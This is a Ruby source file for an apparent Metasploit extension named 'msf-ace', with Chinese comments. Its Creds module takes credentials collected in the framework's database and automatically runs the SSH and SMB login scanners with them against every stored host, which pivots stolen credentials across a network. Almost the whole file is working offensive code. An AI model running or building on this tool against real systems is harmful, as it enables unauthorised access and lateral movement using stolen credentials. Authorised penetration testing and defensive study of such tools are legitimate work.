# msf-ace/src/ace/modules/creds.rb
module Ace
  module Modules
    class Creds
      attr_reader :name, :description, :framework

      def initialize(framework, opts)
        @name = "Creds"
        @description = "Manages and pivots with collected credentials."
        @framework = framework
      end

      def handle_command(action, args)
        case action.downcase
        when 'pivot'
          pivot_credentials
        else
          print_module_help
        end
      end

      private

      def pivot_credentials
        creds = framework.db.creds.where.not(private_type: 'nopass')
        hosts = framework.db.hosts
        
        if creds.empty?
          print_error("No usable credentials found in the database.")
          return
        end
        
        print_status("Starting credential pivot with #{creds.count} credential(s) against #{hosts.count} host(s).")

        # 为每个凭证类型运行对应的登录模块
        # 这是一个简化的示例，可以扩展支持更多协议
        run_login_scanner('auxiliary/scanner/ssh/ssh_login', creds, hosts)
        run_login_scanner('auxiliary/scanner/smb/smb_login', creds, hosts)
        
        print_good("Credential pivot finished.")
      end

      def run_login_scanner(module_name, creds, hosts)
        print_status("Running #{module_name}...")
        login_module = framework.modules.create(module_name)
        
        # 创建临时文件来存储用户名和密码
        user_file = Rex::Quickfile.new('ace_users_')
        pass_file = Rex::Quickfile.new('ace_pass_')
        
        creds.each do |cred|
          user_file.puts(cred.public)
          pass_file.puts(cred.private)
        end
        user_file.close
        pass_file.close

        # 配置模块选项
        opts = {
          'RHOSTS' => hosts.map(&:address).join(' '),
          'USER_FILE' => user_file.path,
          'PASS_FILE' => pass_file.path,
          'STOP_ON_SUCCESS' => true # 找到一个就停止，提高效率
        }
        
        login_module.run_simple(
          'LocalInput'  => framework.input,
          'LocalOutput' => framework.output,
          'OptionStr'   => opts.map { |k,v| "#{k}=#{v}" }.join(',')
        )
        
        # 清理临时文件
        File.unlink(user_file.path)
        File.unlink(pass_file.path)
      end

      def print_module_help
        print_line "Creds Module: ace creds <pivot>"
      end
    end
  end
end
